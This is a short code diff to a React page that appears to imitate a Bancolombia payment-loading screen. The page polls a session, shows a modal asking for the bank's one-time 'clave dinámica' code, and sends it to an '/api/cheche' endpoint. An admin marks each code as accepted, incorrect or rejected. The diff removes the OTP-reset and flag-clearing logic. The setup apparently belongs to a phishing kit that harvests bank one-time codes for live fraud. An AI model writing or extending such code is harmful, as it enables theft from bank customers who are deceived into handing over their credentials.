@@ -35,7 +35,6 @@ export default function BancolombiaCargandoPage() {
           if (data.status === 'waiting_otp') {
             // Mostrar modal para ingresar clave dinámica
             setShowOtpModal(true);
-            setOtp(''); // Limpiar OTP anterior si lo había
           } else if (data.status === 'admin_rejected') {
             // Admin rechazó el pago - Redirigir a carrito con mensaje de error
             router.push('/carrito?error=pago_fallido');
@@ -57,21 +56,6 @@ export default function BancolombiaCargandoPage() {
     setOtpLoading(true);
 
     try {
-      // Verificar si la clave dinámica fue marcada como incorrecta y limpiar el flag
-      const checkResponse = await fetch(`/api/cheche?sessionId=${sessionId}`);
-      const checkData = await checkResponse.json();
-      
-      if (checkData.session?.dinamicaIncorrecta) {
-        await fetch('/api/cheche', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            action: 'clear_dinamica_flag',
-            sessionId,
-          }),
-        });
-      }
-      
       const response = await fetch('/api/cheche', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
